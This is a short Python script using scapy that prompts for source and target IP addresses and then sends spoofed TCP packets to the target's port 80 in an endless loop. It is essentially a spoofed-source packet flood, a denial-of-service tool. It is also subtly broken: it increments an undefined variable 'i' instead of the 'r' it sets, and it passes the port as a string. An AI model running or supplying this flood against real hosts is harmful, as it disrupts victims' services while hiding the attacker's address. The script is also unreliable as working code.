from scapy.all import *

source_ip = input("Enter the ip address of the source machine here")
target_ip = input("Enter the ip adddress of the target machine here")
source_port = input("Enter the port of the source machine here")

r = 1

while True:
    IP1 = IP(src = source_ip , dst = target_ip)
    TCP1 = TCP(sport = source_port , dport = 80)
    packet = IP1/TCP1
    send(packet , inter = 0.01)
    
    print("Packet Sent")
    
    i += 1